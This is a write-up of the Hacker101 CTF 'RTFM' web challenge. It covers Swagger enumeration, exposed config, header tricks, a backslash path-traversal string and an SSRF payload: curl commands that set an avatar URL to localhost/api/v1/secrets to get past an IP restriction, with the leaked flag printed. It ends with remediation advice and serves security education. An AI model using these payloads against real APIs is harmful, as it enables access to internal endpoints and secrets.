# RTFM — Complete Writeup (8/8)

**Difficulty:** Moderate  
**Category:** Web  
**Platform:** Hacker101 CTF (level 43)  
**Flags:** 8/8 — Completed 2026-10-01

---

## Challenge Overview

**Context:** A versioned REST API (`/api/v1/`, `/api/v2/`) with Swagger/OpenAPI. Simulates a user platform with posts, configuration, status, an admin panel, and a secret endpoint (`/secrets`) protected by IP restriction — only `localhost` can access it.

**What you face:** 8 flags spread across different endpoints and techniques. Each flag requires a different vector: enumeration, info disclosure, header manipulation, path traversal, and finally SSRF to bypass the IP restriction.

**Vulnerabilities exploited:**
- Information Disclosure (CWE-200) — Swagger exposes endpoints, user creation returns `flag`, config exposed at `/config`
- Parameter Fuzzing — `?verbose=X` on `/status` returns extra data
- Missing Authentication — admin user-list accessible with `X-Session` header
- Path Traversal (CWE-22) — `post-analytics/..\private` accesses a restricted area
- SSRF — Server-Side Request Forgery (CWE-918) via `avatar` field that the server fetches internally, bypassing IP restriction on `/secrets`

**What you learn:**
- SSRF via URL fields (avatar, webhook, thumbnail) is an underestimated vector in APIs
- Localhost bypasses IP-based ACLs — if the server fetches URLs, it has access to internal endpoints
- Swagger in production without authentication exposes the entire attack surface
- Each endpoint of an API can have its own independent vulnerability
- Path traversal with `..\ ` (backslash) works on some servers even with `/` sanitization

---

## Attack Summary

Versioned REST API with endpoints (/api/v1/, /api/v2/). The 8 flags are obtained via:
1. Endpoint enumeration (Swagger/OpenAPI)
2. Information disclosure on user creation
3. Exposed configuration
4. Verbose parameter on /status
5. X-Session header on admin user-list (v2)
6. User posts endpoint (v1)
7. Path traversal in analytics (..\private)
8. **SSRF via avatar field → access to protected /secrets endpoint**

---

## Flags

| # | Endpoint | Technique | Flag |
|---|----------|-----------|------|
| 1 | /api/v2/swagger.json | Enumeration | In swagger.json |
| 2 | POST /api/v1/user | Info disclosure on registration | In `flag` field of response |
| 3 | GET /api/v1/config | Exposed config | In config JSON |
| 4 | GET /api/v1/status?verbose=X | Parameter fuzzing | In verbose response |
| 5 | GET /api/v2/admin/user-list | X-Session header | In user list |
| 6 | GET /api/v1/user/posts/1 | X-Token header | In posts response |
| 7 | GET /api/v1/post-analytics/..\ private | Path traversal | In private analytics |
| 8 | PUT /api/v1/user (avatar SSRF) | SSRF → /api/v1/secrets | In `example_data` |

---

## Flag 8 — Detailed Step-by-Step

### Context
- `/api/v1/secrets` returns `403 Forbidden: "Access not allowed from your IP address"`
- `/api/v1/user` accepts PUT with an `avatar` field (image URL)
- The server fetches the avatar resource internally → SSRF

### Exploitation

```bash
RTFM="https://0adec0779688947a81f8f0fe61967703.ctf.hacker101.com"

# 1. Register user and login
curl -sX POST "$RTFM/api/v1/user" -d "username=hacker101pwn&password=password123"
curl -sX POST "$RTFM/api/v1/user/login" -d "username=hacker101pwn&password=password123"
# → token: 29707258489ac1db937e5c2fb65d23eb

# 2. SSRF: server-side request to localhost bypasses IP restriction
curl -sX PUT "$RTFM/api/v1/user" \
  -H "X-Token: 29707258489ac1db937e5c2fb65d23eb" \
  --data-urlencode "avatar=http://localhost/api/v1/secrets"
```

### Response
```json
{
  "error": "Non Image detected",
  "example_data": "{\"private_key\":\"^FLAG^7b919b021fa706ef3447d136cf67ad5840578b8e4368142cd15132f39e0ed467$FLAG$\"}"
}
```

The server fetched `/api/v1/secrets` via localhost (IP bypass), detected it was not an image, but exposed the content in `example_data`.

**Flag 8:** `^FLAG^7b919b021fa706ef3447d136cf67ad5840578b8e4368142cd15132f39e0ed467$FLAG$`

---

## Lessons Learned

1. **URL fields in APIs are SSRF vectors**: avatar, webhook, thumbnail — any field the server fetches must be validated
2. **IP-based restrictions fail against SSRF**: requests from localhost bypass ACLs that restrict external IPs
3. **Swagger without auth = complete attack surface**: introspection is a recon tool, not just documentation
4. **Error messages can expose fetched content**: even a "non-image" error leaked the secrets payload
5. **Backslash path traversal**: `..\ ` works on some servers where `../` is sanitized

## Remediation

- Block internal IP ranges (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, etc.) in URL-fetching fields
- Use an allowlist of permitted URL schemes and hosts for avatar/webhook fields
- Disable Swagger/OpenAPI in production or add authentication
- Never expose raw fetched content in error responses
- Validate and sanitize all path parameters — reject both `/` and `\` traversal sequences
